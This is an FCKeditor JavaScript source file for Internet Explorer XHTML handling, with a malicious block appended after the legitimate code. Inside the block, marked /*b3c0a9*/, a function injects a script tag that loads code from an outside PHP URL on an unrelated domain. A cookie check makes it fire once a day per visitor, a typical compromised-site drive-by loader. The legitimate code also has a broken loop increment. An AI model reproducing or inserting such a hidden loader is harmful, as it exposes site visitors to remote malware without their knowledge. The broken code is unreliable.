/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckxhtml_ie.js
 * 	Defines the FCKXHtml object, responsible for the XHTML operations.
 * 	IE specific.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

FCKXHtml._GetMainXmlString = function()
{
	return this.MainNode.xml ;
}

FCKXHtml._AppendEntity = function( xmlNode, entity )
{
	xmlNode.appendChild( this.XML.createEntityReference( entity ) ) ;
}

FCKXHtml._AppendAttributes = function( xmlNode, htmlNode, node, nodeName )
{
	var aAttributes = htmlNode.attributes ;

	for ( var n = 0 ; n < aAttributes.length ; n   )
	{
		var oAttribute = aAttributes[n] ;

		if ( oAttribute.specified )
		{
			var sAttName = oAttribute.nodeName.toLowerCase() ;
			var sAttValue ;

			// Ignore any attribute starting with "_fck".
			if ( sAttName.startsWith( '_fck' ) )
				continue ;
			// The following must be done because of a bug on IE regarding the style
			// attribute. It returns "null" for the nodeValue.
			else if ( sAttName == 'style' )
				sAttValue = htmlNode.style.cssText ;
			// There are two cases when the oAttribute.nodeValue must be used:
			//		- for the "class" attribute
			//		- for events attributes (on IE only).
			else if ( sAttName == 'class' || sAttName.indexOf('on') == 0 )
				sAttValue = oAttribute.nodeValue ;
			else if ( nodeName == 'body' && sAttName == 'contenteditable' )
				continue ;
			// XHTML doens't support attribute minimization like "CHECKED". It must be trasformed to cheched="checked".
			else if ( oAttribute.nodeValue === true )
				sAttValue = sAttName ;
			// We must use getAttribute to get it exactly as it is defined.
			else if ( ! (sAttValue = htmlNode.getAttribute( sAttName, 2 ) ) )
				sAttValue = oAttribute.nodeValue ;

			if ( FCKConfig.ForceSimpleAmpersand && sAttValue.replace )
				sAttValue = sAttValue.replace( /&/g, '___FCKAmp___' ) ;

			this._AppendAttribute( node, sAttName, sAttValue ) ;
		}
	}
}

FCKXHtml.TagProcessors['meta'] = function( node, htmlNode )
{
	var oHttpEquiv = node.attributes.getNamedItem( 'http-equiv' ) ;

	if ( oHttpEquiv == null || oHttpEquiv.value.length == 0 )
	{
		// Get the http-equiv value from the outerHTML.
		var sHttpEquiv = htmlNode.outerHTML.match( FCKRegexLib.MetaHttpEquiv ) ;

		if ( sHttpEquiv )
		{
			sHttpEquiv = sHttpEquiv[1] ;
			FCKXHtml._AppendAttribute( node, 'http-equiv', sHttpEquiv ) ;
		}
	}

	return node ;
}

// IE automaticaly changes <FONT> tags to <FONT size= 0>.
FCKXHtml.TagProcessors['font'] = function( node, htmlNode )
{
	if ( node.attributes.length == 0 )
		node = FCKXHtml.XML.createDocumentFragment() ;

	FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

// IE doens't see the value attribute as an attribute for the <INPUT> tag.
FCKXHtml.TagProcessors['input'] = function( node, htmlNode )
{
	if ( htmlNode.name )
		FCKXHtml._AppendAttribute( node, 'name', htmlNode.name ) ;

	if ( htmlNode.value && !node.attributes.getNamedItem( 'value' ) )
		FCKXHtml._AppendAttribute( node, 'value', htmlNode.value ) ;

	return node ;
}

// IE ignores the "SELECTED" attribute so we must add it manually.
FCKXHtml.TagProcessors['option'] = function( node, htmlNode )
{
	if ( htmlNode.selected && !node.attributes.getNamedItem( 'selected' ) )
		FCKXHtml._AppendAttribute( node, 'selected', 'selected' ) ;

	FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

// There is a BUG in IE regarding the ABBR tag (it has no support for it).
FCKXHtml.TagProcessors['abbr'] = function( node, htmlNode )
{
	// TODO: The XHTML processor duplicates the ABBR contents because of this 
	// code. We should find some way to move to the node after the /ABBR in the
	// _AppendChildNodes loop.

	var oNextNode = htmlNode.nextSibling ;

	while ( true )
	{
		if ( oNextNode && oNextNode.nodeName != '/ABBR' )
		{
			FCKXHtml._AppendNode( node, oNextNode ) ;
			oNextNode = oNextNode.nextSibling ;
		}
		else
			break ;
	}

	return node ;
}

// IE ignores the "COORDS" and "SHAPE" attribute so we must add it manually.
FCKXHtml.TagProcessors['area'] = function( node, htmlNode )
{
	if ( ! node.attributes.getNamedItem( 'coords' ) )
	{
		var sCoords = htmlNode.getAttribute( 'coords', 2 ) ;
		if ( sCoords && sCoords != '0,0,0' )
			FCKXHtml._AppendAttribute( node, 'coords', sCoords ) ;
	}

	if ( ! node.attributes.getNamedItem( 'shape' ) )
	{
		var sCoords = htmlNode.getAttribute( 'shape', 2 ) ;
		if ( sCoords && sCoords.length > 0 )
			FCKXHtml._AppendAttribute( node, 'shape', sCoords ) ;
	}

	return node ;
}

FCKXHtml.TagProcessors['label'] = function( node, htmlNode )
{
	if ( htmlNode.htmlFor.length > 0 )
		FCKXHtml._AppendAttribute( node, 'for', htmlNode.htmlFor ) ;

	FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

FCKXHtml.TagProcessors['form'] = function( node, htmlNode )
{
	if ( htmlNode.acceptCharset && htmlNode.acceptCharset.length > 0 && htmlNode.acceptCharset != 'UNKNOWN' )
		FCKXHtml._AppendAttribute( node, 'accept-charset', htmlNode.acceptCharset ) ;

	if ( htmlNode.name ) 
		FCKXHtml._AppendAttribute( node, 'name', htmlNode.name ) ; 

	FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

// IE doens't hold the name attribute as an attribute for the <TEXTAREA> and <SELECT> tags.
FCKXHtml.TagProcessors['textarea'] = FCKXHtml.TagProcessors['select'] = function( node, htmlNode )
{ 
	if ( htmlNode.name ) 
		FCKXHtml._AppendAttribute( node, 'name', htmlNode.name ) ; 

	FCKXHtml._AppendChildNodes( node, htmlNode ) ; 
 
	return node ; 
} 

// On very rare cases, IE is loosing the "align" attribute for DIV. (right align and apply bulleted list)
FCKXHtml.TagProcessors['div'] = function( node, htmlNode )
{
	if ( htmlNode.align.length > 0 )
		FCKXHtml._AppendAttribute( node, 'align', htmlNode.align ) ;

	FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
